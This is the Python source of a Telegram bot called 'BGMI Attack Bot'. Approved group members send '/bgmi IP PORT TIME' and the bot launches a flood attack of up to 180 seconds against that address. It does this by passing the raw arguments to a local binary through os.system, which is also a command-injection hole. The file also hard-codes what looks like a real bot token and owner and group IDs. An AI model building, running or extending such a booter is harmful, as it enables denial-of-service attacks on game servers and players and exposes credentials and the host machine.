import os
import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from telegram.constants import ParseMode

# Bot configuration
TOKEN = "7877126466:AAH6lNFpehRtrqV7pU4Gl2hHV5UNupLLsfo"
OWNER_ID = 1174779637
GROUP_ID = -1002563728588  # Your group ID

# Global variables
bot_active = True
approved_users = set()
user_attacks = {}
user_feedbacks = {}
banned_users = {}
attack_logs = []
current_attack = None

# Data handling
def load_data():
    try:
        with open("approved_users.txt", "r") as f:
            approved_users.update(int(line.strip()) for line in f if line.strip())
    except FileNotFoundError:
        pass
    
    try:
        with open("user_attacks.txt", "r") as f:
            for line in f:
                if line.strip():
                    user_id, count = map(int, line.strip().split())
                    user_attacks[user_id] = count
    except FileNotFoundError:
        pass
    
    try:
        with open("logs.txt", "r") as f:
            attack_logs.extend(line.strip() for line in f if line.strip())
    except FileNotFoundError:
        pass

def save_data():
    with open("approved_users.txt", "w") as f:
        f.write("\n".join(map(str, approved_users)))
    
    with open("user_attacks.txt", "w") as f:
        f.write("\n".join(f"{k} {v}" for k, v in user_attacks.items()))
    
    with open("logs.txt", "w") as f:
        f.write("\n".join(attack_logs))

# Helper functions
def is_owner(user_id): return user_id == OWNER_ID
def is_approved(user_id): return user_id in approved_users or is_owner(user_id)
def is_banned(user_id): return user_id in banned_users and datetime.now() < banned_users[user_id]

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID: return
    await update.message.reply_text(
        f"🚀 Welcome to BGMI Attack Bot!\n\n"
        "Use /help for commands\n"
        "Use /rule for rules",
        parse_mode=ParseMode.MARKDOWN
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID: return
    help_text = """
*Available Commands:*
/start - Welcome message
/help - Show commands
/rule - Show rules
/bgmi IP PORT TIME - Attack (max 180s)

*Admin Commands:*
/admincmd - Show admin commands
/add USER_ID - Approve user
/remove USER_ID - Remove user
/boton - Turn bot on
/botoff - Turn bot off
/allusers - List approved users
/logs - Show attack logs
/broadcast MESSAGE - Broadcast to all
/clearlogs - Clear all logs
/clearuser - Clear all users
"""
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def rule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID: return
    rules_text = """
*RULES:*
1. Only one attack at a time
2. Must give photo feedback after attack
3. No duplicate feedbacks
4. Max attack time: 180 seconds
5. Contact @HMSahil for help
"""
    await update.message.reply_text(rules_text, parse_mode=ParseMode.MARKDOWN)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_attack
    
    if not bot_active or update.effective_chat.id != GROUP_ID: return
    
    user = update.effective_user
    user_id = user.id
    
    # Check requirements
    if user_id not in user_feedbacks:
        await update.message.reply_text("❌ First send photo feedback!", parse_mode=ParseMode.MARKDOWN)
        return
    
    if current_attack:
        await update.message.reply_text(
            f"⚠️ {current_attack['username']} is currently attacking!",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Validate command
    if len(context.args) != 3:
        await update.message.reply_text("Format: /bgmi IP PORT TIME")
        return
    
    try:
        ip, port, attack_time = context.args[0], context.args[1], int(context.args[2])
        if attack_time > 180:
            await update.message.reply_text("Max attack time is 180s")
            return
    except ValueError:
        await update.message.reply_text("Invalid time format")
        return
    
    # Start attack
    username = user.username or user.first_name
    current_attack = {
        'user_id': user_id,
        'username': username,
        'end_time': datetime.now() + timedelta(seconds=attack_time),
        'ip': ip,
        'port': port
    }
    
    await update.message.reply_text(
        f"⚡ {username} started attack!\n"
        f"IP: {ip}\nPort: {port}\nTime: {attack_time}s",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Execute attack
    os.system(f"./fuck {ip} {port} {attack_time}")
    
    # Log attack
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    attack_logs.append(f"{timestamp} - {username} attacked {ip}:{port} for {attack_time}s")
    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
    
    # Remove feedback requirement
    if user_id in user_feedbacks:
        del user_feedbacks[user_id]
    
    # Schedule completion
    asyncio.create_task(finish_attack(update, context, attack_time))
    save_data()

async def finish_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, attack_time: int):
    global current_attack
    await asyncio.sleep(attack_time)
    if current_attack:
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"✅ Attack completed by {current_attack['username']}!\n"
                 "Send photo feedback for next attack",
            parse_mode=ParseMode.MARKDOWN
        )
        current_attack = None

# Admin commands
async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ Owner command only!", parse_mode=ParseMode.MARKDOWN)
        return
    await update.message.reply_text("""
*Admin Commands:*
/add USER_ID - Approve user
/remove USER_ID - Remove user
/boton - Turn bot on
/botoff - Turn bot off
/allusers - List approved users
/logs - Show attack logs
/broadcast MESSAGE - Broadcast to all
/clearlogs - Clear all logs
/clearuser - Clear all users
""", parse_mode=ParseMode.MARKDOWN)

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    try:
        user_id = int(context.args[0])
        approved_users.add(user_id)
        save_data()
        await update.message.reply_text(f"✅ User {user_id} approved")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /add USER_ID")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    try:
        user_id = int(context.args[0])
        if user_id in approved_users:
            approved_users.remove(user_id)
            save_data()
            await update.message.reply_text(f"✅ User {user_id} removed")
        else:
            await update.message.reply_text("User not in approved list")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /remove USER_ID")

async def bot_on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    global bot_active
    bot_active = True
    await update.message.reply_text("✅ Bot activated")

async def bot_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    global bot_active
    bot_active = False
    await update.message.reply_text("❌ Bot deactivated")

async def all_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if not approved_users:
        await update.message.reply_text("No approved users")
        return
    await update.message.reply_text(
        "*Approved Users:*\n" + "\n".join(map(str, approved_users)),
        parse_mode=ParseMode.MARKDOWN
    )

async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if not attack_logs:
        await update.message.reply_text("No attack logs")
        return
    with open("attack_logs.txt", "w") as f:
        f.write("\n".join(attack_logs))
    await update.message.reply_document(open("attack_logs.txt", "rb"))

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast MESSAGE")
        return
    message = " ".join(context.args)
    for user_id in approved_users:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
        except:
            pass
    await update.message.reply_text(f"Broadcast sent to {len(approved_users)} users")

async def clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    global attack_logs
    attack_logs = []
    save_data()
    await update.message.reply_text("✅ Logs cleared")

async def clear_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id): return
    global approved_users
    approved_users = set()
    save_data()
    await update.message.reply_text("✅ Approved users cleared")

# Photo handler
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not bot_active or update.effective_chat.id != GROUP_ID: return
    
    user = update.effective_user
    photo_id = update.message.photo[-1].file_id
    
    if photo_id in user_feedbacks.values():
        banned_users[user.id] = datetime.now() + timedelta(minutes=5)
        await update.message.reply_text("❌ Duplicate feedback! 5min ban", parse_mode=ParseMode.MARKDOWN)
        return
    
    user_feedbacks[user.id] = photo_id
    await update.message.reply_text("✅ Feedback accepted! Now you can attack", parse_mode=ParseMode.MARKDOWN)

def main():
    load_data()
    app = Application.builder().token(TOKEN).build()
    
    # Command handlers
    commands = [
        ('start', start),
        ('help', help_cmd),
        ('rule', rule),
        ('bgmi', bgmi),
        ('admincmd', admin_cmd),
        ('add', add_user),
        ('remove', remove_user),
        ('boton', bot_on),
        ('botoff', bot_off),
        ('allusers', all_users),
        ('logs', show_logs),
        ('broadcast', broadcast),
        ('clearlogs', clear_logs),
        ('clearuser', clear_users)
    ]
    
    for cmd, handler in commands:
        app.add_handler(CommandHandler(cmd, handler))
    
    # Photo handler
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    print("BGMI Attack Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
